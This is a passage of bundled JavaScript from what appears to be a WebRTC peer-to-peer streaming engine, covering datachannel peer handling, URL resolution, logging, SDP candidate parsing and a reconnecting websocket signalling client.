            // 计算下载速度 byte/ms = KB/s
            var loadedBytes = 0;
            for (var j = 0; j < this.bufArr.length; j++) {
                loadedBytes += this.bufArr[j].byteLength;
            }
            var downloadSpeed = loadedBytes / (performance.now() - this.timeReceivePiece);
            var minRequiredSpeed = (this.expectedSize - loadedBytes) / remainLoadTime;
            // console.warn(`downloadSpeed ${downloadSpeed} minRequiredSpeed ${minRequiredSpeed}`);
            return downloadSpeed >= minRequiredSpeed;
        }
    }, {
        key: 'close',
        value: function close() {
            this.emit(_events4.default.DC_CLOSE);
        }
    }, {
        key: 'receiveSignal',
        value: function receiveSignal(data) {
            if (this.cpr === SIGNAL_PACK_VER || !data.type) {
                // data = unpack(data, this.channelId);       // firefox不支持
                this.cpr = SIGNAL_PACK_VER;
                data = (0, _sdp.unpack)(data, this.cpr + '');
            }
            // console.warn(JSON.stringify(data));
            if (data) this._datachannel.signal(data);
        }
    }, {
        key: 'resetContinuousHits',
        value: function resetContinuousHits() {
            var value = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 0;

            this.logger.info('reset ' + this.remotePeerId + ' continuousHits');
            this.continuousHits = value;
        }
    }, {
        key: 'increContinuousHits',
        value: function increContinuousHits() {
            this.continuousHits++;
        }
    }, {
        key: 'destroy',
        value: function destroy() {
            this.logger.info('destroy datachannel ' + this.channelId);
            // window.clearTimeout(this.requestTimeout);                            //清除定时器
            if (this.chokeTimer) clearTimeout(this.chokeTimer);
            if (this.connTimeout) clearTimeout(this.connTimeout);
            if (this.uploading) this.sendMsgPieceAbort('peer is closing');
            // 通知其他peer abort
            if (this.downloadListeners.length > 0) {
                var _iteratorNormalCompletion2 = true;
                var _didIteratorError2 = false;
                var _iteratorError2 = undefined;

                try {
                    for (var _iterator2 = this.downloadListeners[Symbol.iterator](), _step2; !(_iteratorNormalCompletion2 = (_step2 = _iterator2.next()).done); _iteratorNormalCompletion2 = true) {
                        var item = _step2.value;
                        var handler = item.handler;

                        handler(this.bufSN, this.segId, true, "upstream peer is closed");
                    }
                } catch (err) {
                    _didIteratorError2 = true;
                    _iteratorError2 = err;
                } finally {
                    try {
                        if (!_iteratorNormalCompletion2 && _iterator2.return) {
                            _iterator2.return();
                        }
                    } finally {
                        if (_didIteratorError2) {
                            throw _iteratorError2;
                        }
                    }
                }

                this.downloadListeners = [];
            }
            var msg = {
                event: _events4.default.DC_CLOSE
            };
            this.sendJson(msg);
            this._datachannel.removeAllListeners();
            this.removeAllListeners();
            this._datachannel.destroy();
            this.engine = null;
        }
    }, {
        key: '_handleBinaryMsg',
        value: function _handleBinaryMsg(data) {
            this.bufArr.push(data);
            this.remainAttachments--;

            // 通知其他peer已经有新的data
            if (this.downloadListeners.length > 0) {
                var _iteratorNormalCompletion3 = true;
                var _didIteratorError3 = false;
                var _iteratorError3 = undefined;

                try {
                    for (var _iterator3 = this.downloadListeners[Symbol.iterator](), _step3; !(_iteratorNormalCompletion3 = (_step3 = _iterator3.next()).done); _iteratorNormalCompletion3 = true) {
                        var item = _step3.value;
                        var handler = item.handler;
                        // console.warn(`handler sn ${this.bufSN} length ${targetBuffer.byteLength}`);

                        handler(this.bufSN, this.segId, false, data, this.remainAttachments === 0);
                    }
                } catch (err) {
                    _didIteratorError3 = true;
                    _iteratorError3 = err;
                } finally {
                    try {
                        if (!_iteratorNormalCompletion3 && _iterator3.return) {
                            _iterator3.return();
                        }
                    } finally {
                        if (_didIteratorError3) {
                            throw _iteratorError3;
                        }
                    }
                }
            }

            if (this.remainAttachments === 0) {
                this.downloadListeners = [];
                // 计算下载速度

                if (this.timeSendRequest > 0) {
                    var downloadSpeed = this.expectedSize / (performance.now() - this.timeSendRequest);
                    // console.warn(this.remotePeerId + " expectedSize " + this.expectedSize + " time " +
                    //     (performance.now() - this.timeSendRequest) +
                    //     " downloadSpeed " + downloadSpeed);
                    this.weight = this.weight > 0 ? ALPHA * this.weight + (1 - ALPHA) * downloadSpeed : downloadSpeed; // 设置本节点的权重
                    // console.warn("weight " + this.weight);
                }

                // console.warn(`remainAttachments downloadNum ${this.downloadNum}`);

                this.sendJson({ //发送给peer确认信息
                    event: _events4.default.DC_PIECE_ACK,
                    sn: this.bufSN,
                    seg_id: this.segId,
                    size: this.expectedSize
                });
                this.timeSendRequest = 0;
                this.timeReceivePiece = 0;

                // 从请求队列拿出一个msg
                if (!this._sendNextReq()) {
                    this.downloading = false;
                }

                this._handleBinaryData();
            }
        }
    }, {
        key: '_sendNextReq',
        value: function _sendNextReq() {
            if (this.sendReqQueue.length > 0) {
                var msg = this.sendReqQueue.shift();
                this.logger.info('get msg from sendReqQueue ' + JSON.stringify(msg));
                this._realRequestData(msg);
                return true;
            }
            return false;
        }
    }, {
        key: '_handlePlaylist',
        value: function _handlePlaylist(msg) {
            var url = msg.url,
                data = msg.data,
                seq = msg.seq;
            // const ts = getCurrentTs();
            // console.warn(`this.playlistMap.set ${url} seq ${seq}`)

            this.playlistMap.set(url, {
                data: data,
                seq: seq
            });
        }
    }, {
        key: 'getLatestPlaylist',
        value: function getLatestPlaylist(url, lastSeq) {
            if (!this.playlistMap.has(url)) {
                // console.warn(`playlistMap no url ${url}`);
                return null;
            }
            var playlist = this.playlistMap.get(url);
            if (playlist.seq <= lastSeq) {
                // console.warn(`playlist.ts <= lastTs`);
                return null;
            }
            return playlist;
        }
    }, {
        key: '_handleMetadata',
        value: function _handleMetadata(msg) {
            var _this3 = this;

            var logger = this.logger;

            if (this.isInitiator) {
                var duration = performance.now() - this.timeSendRequest;
                if (duration > 0) {
                    this.weight = 100000 / duration;
                    logger.info('handle Metadata from ' + this.remotePeerId + ' initial weight ' + this.weight);
                }
                this.timeSendRequest = 0;
            }
            // clearTimeout(this.connTimeout);    // TODO bug
            // 识别频道ID
            var channel = msg.channel;
            if (!channel) {
                logger.error('peer channel ' + channel + ' is null!');
                this.emit(_events4.default.DC_ERROR, true);
                return;
            }
            // console.warn(`channel ${this.channel} peer channel ${channel}`);
            if (this.channel !== channel) {
                logger.error('peer channel ' + channel + ' not matched!');
                this.emit(_events4.default.DC_ERROR, true);
                return;
            }
            // 识别platform
            var plat = msg.platform;
            switch (plat) {
                case _events4.default.DC_PLAT_ANDROID:
                    this.platform = _events4.default.DC_PLAT_ANDROID;
                    break;
                case _events4.default.DC_PLAT_IOS:
                    this.platform = _events4.default.DC_PLAT_IOS;
                    break;
                case _events4.default.DC_PLAT_WEB:
                    this.platform = _events4.default.DC_PLAT_WEB;
                    break;
            }
            // 识别mobile
            this.mobile = msg.mobile || false;
            this.mobileWeb = this.mobile && this.platform === _events4.default.DC_PLAT_WEB || false;

            this.sequential = msg.sequential;
            if (this.sequential !== this.typeExpected) {
                logger.error('peer sequential type ' + this.sequential + ' not matched!');
                this.emit(_events4.default.DC_ERROR, true);
                return;
            }
            logger.info(this.remotePeerId + ' platform ' + this.platform + ' sequential ' + this.sequential);

            if (msg.peers) {
                this.peersConnected += msg.peers;
                logger.info(this.remotePeerId + ' now has ' + this.peersConnected + ' peers');
            }
            this.emit(_events4.default.DC_METADATA, msg);

            if (!msg.field || this.config.live) return;
            if (msg.sequential) {
                msg.field.forEach(function (value) {
                    if (value > 0) {
                        if (value < _this3.startSN) {
                            _this3.startSN = value;
                        }
                        if (value > _this3.endSN) {
                            _this3.endSN = value;
                        }
                    }
                });
            }
        }
    }, {
        key: '_handleStats',
        value: function _handleStats(msg) {
            var totalConns = msg.total_conns;
            if (totalConns > 0 && this.peersConnected !== totalConns) {
                this.peersConnected = totalConns;
                this.logger.info(this.remotePeerId + ' now has ' + this.peersConnected + ' peers');
            }
        }
    }, {
        key: '_handleRequestMsg',
        value: function _handleRequestMsg(msg) {
            if (this.uploading) {
                this.logger.warn(this.remotePeerId + ' is uploading when receive request');
                return;
            }

            // test
            // if (!msg.urgent) {
            //     console.warn(`!test`);
            //     return;
            // }

            this.uploading = true;
            this.emit(_events4.default.DC_REQUEST, msg);
        }
    }, {
        key: '_handlePieceAck',
        value: function _handlePieceAck(msg) {
            // 计算上传速度  byte/ms = KB/s
            if (this.timeSendPiece !== 0) {
                this.uploadSpeed = Math.round(msg.size / (performance.now() - this.timeSendPiece) * 2);
                this.timeSendPiece = 0;
                this.logger.info(this.remotePeerId + ' uploadSpeed is ' + this.uploadSpeed);
            }
        }
    }, {
        key: '_prepareForBinary',
        value: function _prepareForBinary(attachments, segId, sn, expectedSize) {
            this.bufArr = [];
            this.remainAttachments = attachments;
            this.segId = segId;
            this.bufSN = sn;
            this.expectedSize = expectedSize;
        }
    }, {
        key: '_handleBinaryData',
        value: function _handleBinaryData() {
            var payload = Buffer.concat(this.bufArr);
            // this.logger.debug(`expectedSize ${this.expectedSize}, byteLength ${payload.byteLength}`);
            var byteLength = payload.byteLength;
            if (byteLength === this.expectedSize) {
                //校验数据
                var arrayBuffer = new Uint8Array(payload).buffer; // 将uint8array转为arraybuffer
                var segment = new _segment2.default(this.bufSN, this.segId, arrayBuffer, this.remotePeerId);
                this.emit(_events4.default.DC_RESPONSE, segment, this.weight);
            } else {
                this.logger.error(this.segId + ' expectedSize ' + this.expectedSize + ' not equal to byteLength ' + byteLength);
            }
            // this.logger.info(`datachannel finish downloading ${this.segId} from ${this.remotePeerId}`);
            this.segId = '';
            this.bufArr = [];
            this.expectedSize = -1;
        }
    }, {
        key: 'checkIfNeedChoke',
        value: function checkIfNeedChoke() {
            var _this4 = this;

            var logger = this.logger;

            this.miss++;
            logger.info(this.channelId + ' miss ' + this.miss);
            if (this.miss > DC_TOLERANCE && !this.choked) {
                this.choked = true;
                var chokeDuration = this.miss * 30;
                // 一段时间后失效
                if (chokeDuration <= 150) {
                    logger.warn('datachannel ' + this.channelId + ' is choked');
                    this.chokeTimer = setTimeout(function () {
                        _this4.choked = false;
                        logger.warn('datachannel ' + _this4.channelId + ' is unchoked');
                    }, chokeDuration * 1000);
                } else {
                    logger.warn('datachannel ' + this.channelId + ' is choked permanently');
                }
            }
        }

        //下载超时 外部调用

    }, {
        key: 'loadtimeout',
        value: function loadtimeout() {
            this.logger.warn('timeout while downloading from ' + this.remotePeerId);
            if (this.bufSN && this.pieceMsg.sn === this.bufSN) {
                this.logger.warn(this.bufArr.length + ' of ' + this.pieceMsg.attachments + ' packets loaded');
            } else {
                this.logger.warn('no piece msg received');
            }
            this.emit(_events4.default.DC_TIMEOUT);
            this.checkIfNeedChoke();
        }

        // 发送中断下载消息

    }, {
        key: 'sendMsgPieceAbort',
        value: function sendMsgPieceAbort(reason) {
            this.uploading = false;
            this.sendJson({
                event: _events4.default.DC_PIECE_ABORT,
                reason: reason
            });
        }

        // setupStats() {
        //     this.statser = setInterval(() => {
        //
        //         this._datachannel.getStats((err, reports) => {
        //             this.logger.warn(`reports: ${JSON.stringify(reports, null, 1)}`);
        //         })
        //
        //     }, 10000)
        // }

    }, {
        key: 'isAvailable',
        get: function get() {
            return this.downloadNum < 2 && !this.choked;
        }
    }, {
        key: 'isAvailableUrgently',
        get: function get() {
            return !this.downloading && !this.choked;
        }
    }, {
        key: 'downloadNum',
        get: function get() {
            if (!this.downloading) return 0;
            return this.sendReqQueue.length + 1;
        }
    }]);

    return Peer;
}(_events2.default);

function dividePayload(payload, packetSize, attachments, remainder) {
    var bufArr = [];
    if (remainder) {
        var packet = void 0;
        for (var i = 0; i < attachments - 1; i++) {
            packet = payload.slice(i * packetSize, (i + 1) * packetSize);
            bufArr.push(packet);
        }
        packet = payload.slice(payload.byteLength - remainder, payload.byteLength);
        bufArr.push(packet);
    } else {
        var _packet = void 0;
        for (var _i = 0; _i < attachments; _i++) {
            _packet = payload.slice(_i * packetSize, (_i + 1) * packetSize);
            bufArr.push(_packet);
        }
    }
    return bufArr;
}

exports.default = Peer;
module.exports = exports['default'];

/***/ }),
/* 7 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";
/* WEBPACK VAR INJECTION */(function(module) {var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

// see https://tools.ietf.org/html/rfc1808

(function (root) {
  var URL_REGEX = /^((?:[a-zA-Z0-9+\-.]+:)?)(\/\/[^\/?#]*)?((?:[^\/?#]*\/)*[^;?#]*)?(;[^?#]*)?(\?[^#]*)?(#.*)?$/;
  var FIRST_SEGMENT_REGEX = /^([^\/?#]*)(.*)$/;
  var SLASH_DOT_REGEX = /(?:\/|^)\.(?=\/)/g;
  var SLASH_DOT_DOT_REGEX = /(?:\/|^)\.\.\/(?!\.\.\/)[^\/]*(?=\/)/g;

  var URLToolkit = {
    // If opts.alwaysNormalize is true then the path will always be normalized even when it starts with / or //
    // E.g
    // With opts.alwaysNormalize = false (default, spec compliant)
    // http://a.com/b/cd + /e/f/../g => http://a.com/e/f/../g
    // With opts.alwaysNormalize = true (not spec compliant)
    // http://a.com/b/cd + /e/f/../g => http://a.com/e/g
    buildAbsoluteURL: function buildAbsoluteURL(baseURL, relativeURL, opts) {
      opts = opts || {};
      // remove any remaining space and CRLF
      baseURL = baseURL.trim();
      relativeURL = relativeURL.trim();
      if (!relativeURL) {
        // 2a) If the embedded URL is entirely empty, it inherits the
        // entire base URL (i.e., is set equal to the base URL)
        // and we are done.
        if (!opts.alwaysNormalize) {
          return baseURL;
        }
        var basePartsForNormalise = URLToolkit.parseURL(baseURL);
        if (!basePartsForNormalise) {
          throw new Error('Error trying to parse base URL.');
        }
        basePartsForNormalise.path = URLToolkit.normalizePath(basePartsForNormalise.path);
        return URLToolkit.buildURLFromParts(basePartsForNormalise);
      }
      var relativeParts = URLToolkit.parseURL(relativeURL);
      if (!relativeParts) {
        throw new Error('Error trying to parse relative URL.');
      }
      if (relativeParts.scheme) {
        // 2b) If the embedded URL starts with a scheme name, it is
        // interpreted as an absolute URL and we are done.
        if (!opts.alwaysNormalize) {
          return relativeURL;
        }
        relativeParts.path = URLToolkit.normalizePath(relativeParts.path);
        return URLToolkit.buildURLFromParts(relativeParts);
      }
      var baseParts = URLToolkit.parseURL(baseURL);
      if (!baseParts) {
        throw new Error('Error trying to parse base URL.');
      }
      if (!baseParts.netLoc && baseParts.path && baseParts.path[0] !== '/') {
        // If netLoc missing and path doesn't start with '/', assume everthing before the first '/' is the netLoc
        // This causes 'example.com/a' to be handled as '//example.com/a' instead of '/example.com/a'
        var pathParts = FIRST_SEGMENT_REGEX.exec(baseParts.path);
        baseParts.netLoc = pathParts[1];
        baseParts.path = pathParts[2];
      }
      if (baseParts.netLoc && !baseParts.path) {
        baseParts.path = '/';
      }
      var builtParts = {
        // 2c) Otherwise, the embedded URL inherits the scheme of
        // the base URL.
        scheme: baseParts.scheme,
        netLoc: relativeParts.netLoc,
        path: null,
        params: relativeParts.params,
        query: relativeParts.query,
        fragment: relativeParts.fragment
      };
      if (!relativeParts.netLoc) {
        // 3) If the embedded URL's <net_loc> is non-empty, we skip to
        // Step 7.  Otherwise, the embedded URL inherits the <net_loc>
        // (if any) of the base URL.
        builtParts.netLoc = baseParts.netLoc;
        // 4) If the embedded URL path is preceded by a slash "/", the
        // path is not relative and we skip to Step 7.
        if (relativeParts.path[0] !== '/') {
          if (!relativeParts.path) {
            // 5) If the embedded URL path is empty (and not preceded by a
            // slash), then the embedded URL inherits the base URL path
            builtParts.path = baseParts.path;
            // 5a) if the embedded URL's <params> is non-empty, we skip to
            // step 7; otherwise, it inherits the <params> of the base
            // URL (if any) and
            if (!relativeParts.params) {
              builtParts.params = baseParts.params;
              // 5b) if the embedded URL's <query> is non-empty, we skip to
              // step 7; otherwise, it inherits the <query> of the base
              // URL (if any) and we skip to step 7.
              if (!relativeParts.query) {
                builtParts.query = baseParts.query;
              }
            }
          } else {
            // 6) The last segment of the base URL's path (anything
            // following the rightmost slash "/", or the entire path if no
            // slash is present) is removed and the embedded URL's path is
            // appended in its place.
            var baseURLPath = baseParts.path;
            var newPath = baseURLPath.substring(0, baseURLPath.lastIndexOf('/') + 1) + relativeParts.path;
            builtParts.path = URLToolkit.normalizePath(newPath);
          }
        }
      }
      if (builtParts.path === null) {
        builtParts.path = opts.alwaysNormalize ? URLToolkit.normalizePath(relativeParts.path) : relativeParts.path;
      }
      return URLToolkit.buildURLFromParts(builtParts);
    },
    parseURL: function parseURL(url) {
      var parts = URL_REGEX.exec(url);
      if (!parts) {
        return null;
      }
      return {
        scheme: parts[1] || '',
        netLoc: parts[2] || '',
        path: parts[3] || '',
        params: parts[4] || '',
        query: parts[5] || '',
        fragment: parts[6] || ''
      };
    },
    normalizePath: function normalizePath(path) {
      // The following operations are
      // then applied, in order, to the new path:
      // 6a) All occurrences of "./", where "." is a complete path
      // segment, are removed.
      // 6b) If the path ends with "." as a complete path segment,
      // that "." is removed.
      path = path.split('').reverse().join('').replace(SLASH_DOT_REGEX, '');
      // 6c) All occurrences of "<segment>/../", where <segment> is a
      // complete path segment not equal to "..", are removed.
      // Removal of these path segments is performed iteratively,
      // removing the leftmost matching pattern on each iteration,
      // until no matching pattern remains.
      // 6d) If the path ends with "<segment>/..", where <segment> is a
      // complete path segment not equal to "..", that
      // "<segment>/.." is removed.
      while (path.length !== (path = path.replace(SLASH_DOT_DOT_REGEX, '')).length) {}
      return path.split('').reverse().join('');
    },
    buildURLFromParts: function buildURLFromParts(parts) {
      return parts.scheme + parts.netLoc + parts.path + parts.params + parts.query + parts.fragment;
    }
  };

  if (( false ? 'undefined' : _typeof(exports)) === 'object' && ( false ? 'undefined' : _typeof(module)) === 'object') module.exports = URLToolkit;else if (true) !(__WEBPACK_AMD_DEFINE_ARRAY__ = [], __WEBPACK_AMD_DEFINE_RESULT__ = (function () {
    return URLToolkit;
  }).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),
				__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));else if ((typeof exports === 'undefined' ? 'undefined' : _typeof(exports)) === 'object') exports['URLToolkit'] = URLToolkit;else root['URLToolkit'] = URLToolkit;
})(undefined);
/* WEBPACK VAR INJECTION */}.call(exports, __webpack_require__(11)(module)))

/***/ }),
/* 8 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

/*
    函数节流
    baseInterval: 初始时间间隔
    factor: 增长指数
 */
function getPeersThrottle(method, context) {
    var baseInterval = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 70;

    // function getPeersThrottle(method, context, baseInterval = 25) {
    var handler = null;
    var going = false;
    var factor = 1.0;
    var delay = baseInterval;
    return function () {
        var cancel = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : false;

        if (cancel) {
            clearTimeout(handler);
            going = false;
            return;
        }
        if (going) return;
        going = true;
        handler = setTimeout(function () {
            method.call(context, delay);
            going = false;
            handler = null;
        }, delay * 1000);
        delay *= factor;
    };
};

exports.default = getPeersThrottle;
module.exports = exports["default"];

/***/ }),
/* 9 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _toolFuns = __webpack_require__(0);

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var logMap = {
    debug: 0,
    info: 1,
    warn: 2,
    error: 3,
    none: 4
};

var Logger = function () {
    function Logger(logLevel) {
        _classCallCheck(this, Logger);

        this.logLevel = logLevel;
        this.onlineDebug = false;
        console.debug = console.log;

        if ((logLevel === 'debug' || logLevel === 'info') && false) {
            this.logLevel = "info";
        }

        if (logLevel === true) {
            this.logLevel = 'warn';
        } else if (logLevel === false) {
            this.logLevel = 'none';
        } else if (!(logLevel in logMap)) {
            this.logLevel = 'error'; // 默认error
        }
        this.resetLogger();
    }

    _createClass(Logger, [{
        key: 'enableDebug',
        value: function enableDebug() {
            this.onlineDebug = true;
            for (var key in logMap) {
                this[key] = console[key];
            }
        }
    }, {
        key: 'resetLogger',
        value: function resetLogger() {
            this.onlineDebug = false;
            for (var key in logMap) {
                if (logMap[key] < logMap[this.logLevel]) {
                    this[key] = _toolFuns.noop;
                } else {
                    this[key] = console[key];
                }
            }
        }
    }, {
        key: 'isDebugLevel',
        get: function get() {
            return logMap[this.logLevel] <= 1 || this.onlineDebug;
        }
    }]);

    return Logger;
}();

exports.default = Logger;
module.exports = exports['default'];

/***/ }),
/* 10 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


module.exports = __webpack_require__(19);

/***/ }),
/* 11 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


module.exports = function (module) {
	if (!module.webpackPolyfill) {
		module.deprecate = function () {};
		module.paths = [];
		// module.parent = undefined by default
		if (!module.children) module.children = [];
		Object.defineProperty(module, "loaded", {
			enumerable: true,
			get: function get() {
				return module.l;
			}
		});
		Object.defineProperty(module, "id", {
			enumerable: true,
			get: function get() {
				return module.i;
			}
		});
		module.webpackPolyfill = 1;
	}
	return module;
};

/***/ }),
/* 12 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var promise = void 0;

module.exports = typeof queueMicrotask === 'function' ? queueMicrotask.bind(globalThis)
// reuse resolved promise, and allocate it lazily
: function (cb) {
    return (promise || (promise = Promise.resolve())).then(cb).catch(function (err) {
        return setTimeout(function () {
            throw err;
        }, 0);
    });
};

/***/ }),
/* 13 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var _class = function () {
    function _class(sn, segId, data, fromPeerId) {
        _classCallCheck(this, _class);

        this._sn = sn;
        this._segId = segId;
        this._data = data;
        this._fromPeerId = fromPeerId;
    }

    _createClass(_class, [{
        key: "size",
        get: function get() {
            return this._data.byteLength;
        }
    }, {
        key: "sn",
        get: function get() {
            return this._sn;
        }
    }, {
        key: "segId",
        get: function get() {
            return this._segId;
        }
    }, {
        key: "data",
        get: function get() {
            return this._data;
        }
    }, {
        key: "fromPeerId",
        get: function get() {
            return this._fromPeerId;
        }
    }, {
        key: "isSequential",
        get: function get() {
            return this._sn >= 0;
        }
    }]);

    return _class;
}();

exports.default = _class;
module.exports = exports["default"];

/***/ }),
/* 14 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _slicedToArray = function () { function sliceIterator(arr, i) { var _arr = []; var _n = true; var _d = false; var _e = undefined; try { for (var _i = arr[Symbol.iterator](), _s; !(_n = (_s = _i.next()).done); _n = true) { _arr.push(_s.value); if (i && _arr.length === i) break; } } catch (err) { _d = true; _e = err; } finally { try { if (!_n && _i["return"]) _i["return"](); } finally { if (_d) throw _e; } } return _arr; } return function (arr, i) { if (Array.isArray(arr)) { return arr; } else if (Symbol.iterator in Object(arr)) { return sliceIterator(arr, i); } else { throw new TypeError("Invalid attempt to destructure non-iterable instance"); } }; }();

exports.parseCand = parseCand;

function _toConsumableArray(arr) { if (Array.isArray(arr)) { for (var i = 0, arr2 = Array(arr.length); i < arr.length; i++) { arr2[i] = arr[i]; } return arr2; } else { return Array.from(arr); } }

/** Char used to separate non-fixed width parts. */
var delimiter = exports.delimiter = '|';
var arrayDelimiter = exports.arrayDelimiter = ',';
// h:host s:srflx p:prflx r:relay
var candTypeMap = exports.candTypeMap = {
    h: 'host',
    s: 'srflx',
    p: 'prflx',
    r: 'relay'
};

var sdpType2Char = exports.sdpType2Char = function sdpType2Char(type, trickle) {
    var ret = void 0;
    switch (type) {
        case 'candidate':
            ret = 'c';
            break;
        case 'offer':
            ret = trickle ? 'q' : 'o';
            break;
        case 'answer':
            ret = trickle ? 's' : 'a';
            break;
    }
    return ret;
};

var char2SdpType = exports.char2SdpType = function char2SdpType(char) {
    var ret = {};
    switch (char) {
        case 'o':
            ret = {
                type: 'offer'
            };
            break;
        case 'q':
            ret = {
                type: 'offer',
                trickle: true
            };
            break;
        case 'a':
            ret = {
                type: 'answer'
            };
            break;
        case 's':
            ret = {
                type: 'answer',
                trickle: true
            };
            break;
        case 'c':
            ret = {
                type: 'candidate',
                trickle: true
            };
            break;
    }
    return ret;
};

var charOffset = 0;

/** Converts an array of bytes to a 'human friendly' string. */
var bytesToStr = exports.bytesToStr = function bytesToStr(bytes) {
    return typeof bytes === 'number' ? bytesToStr([bytes]) : String.fromCharCode.apply(String, _toConsumableArray(bytes.map(function (byte) {
        return byte + charOffset;
    })));
};

/** Convert a 'human friendly' string to an array of bytes. */
var strToBytes = exports.strToBytes = function strToBytes(str) {
    return str.split('').map(function (char) {
        return char.charCodeAt(0) - charOffset;
    });
};

function parseCand(candStr) {
    var reg = /(\S*) (\d*) (\S*) (\d*) (\S*) (\d*) typ (\S*)(?: raddr (\S*) rport (\d*))?(?: tcptype (\S*))?(?: generation (\d*))?(?: ufrag (\S*))?(?: network-id (\d*))?(?: network-cost (\d*))?/;

    var _reg$exec = reg.exec(candStr),
        _reg$exec2 = _slicedToArray(_reg$exec, 15),
        foundation = _reg$exec2[1],
        component = _reg$exec2[2],
        transport = _reg$exec2[3],
        priority = _reg$exec2[4],
        ip = _reg$exec2[5],
        port = _reg$exec2[6],
        type = _reg$exec2[7],
        raddr = _reg$exec2[8],
        rport = _reg$exec2[9],
        tcptype = _reg$exec2[10],
        generation = _reg$exec2[11],
        ufrag = _reg$exec2[12],
        networkId = _reg$exec2[13],
        networkCost = _reg$exec2[14];

    return {
        foundation: foundation,
        component: component,
        transport: transport,
        priority: priority,
        ip: ip,
        port: port,
        type: type,
        raddr: raddr,
        rport: rport,
        tcptype: tcptype,
        generation: generation,
        networkId: networkId,
        networkCost: networkCost,
        ufrag: ufrag
    };
}

/***/ }),
/* 15 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


Object.defineProperty(exports, "__esModule", {
    value: true
});

var _createClass = function () { function defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } } return function (Constructor, protoProps, staticProps) { if (protoProps) defineProperties(Constructor.prototype, protoProps); if (staticProps) defineProperties(Constructor, staticProps); return Constructor; }; }();

var _events = __webpack_require__(1);

var _events2 = _interopRequireDefault(_events);

var _reconnectingWebsocket = __webpack_require__(31);

var _reconnectingWebsocket2 = _interopRequireDefault(_reconnectingWebsocket);

var _toolFuns = __webpack_require__(0);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { default: obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

var PING_INTERVAL = 60;
var PONG_TIMEOUT = 15;

var WebsocketClient = function (_EventEmitter) {
    _inherits(WebsocketClient, _EventEmitter);

    function WebsocketClient(engine, addr, config, interval) {
        var name = arguments.length > 4 && arguments[4] !== undefined ? arguments[4] : 'ws';

        _classCallCheck(this, WebsocketClient);

        var _this = _possibleConstructorReturn(this, (WebsocketClient.__proto__ || Object.getPrototypeOf(WebsocketClient)).call(this));

        _this.engine = engine;
        _this.logger = engine.logger;
        _this.config = config;
        // console.warn("SignalClient " + addr);
        _this.wsAddr = addr; // 已经加了查询参数
        _this.connected = false;
        _this.connecting = false;
        _this.serverVersion = 0;
        _this.pingInterval = interval || PING_INTERVAL;
        // this.pingInterval = 30;           // test
        _this._ws = _this._init();
        _this.name = name;
        return _this;
    }

    _createClass(WebsocketClient, [{
        key: '_init',
        value: function _init() {
            var _this2 = this;

            var wsOptions = {
                // debug: true,
                maxRetries: this.config.wsMaxRetries,
                minReconnectionDelay: (0, _toolFuns.randomNum)(10000, 60000), // 生成15到40秒的随机数
                maxReconnectionDelay: 600 * 1000
            };
            // console.warn("ws init " + this.wsAddr + " minReconnectionDelay " + wsOptions.minReconnectionDelay);
            var ws = new _reconnectingWebsocket2.default(this.wsAddr, undefined, wsOptions);
            ws.onopen = function () {
                _this2.logger.info(_this2.name + ' ' + _this2.wsAddr + ' connection opened');

                _this2.connected = true;
                _this2.connecting = false;

                if (_this2.onopen) _this2.onopen();

                _this2._startPing(_this2.pingInterval); // 开始发送心跳包
            };

            ws.push = ws.send;
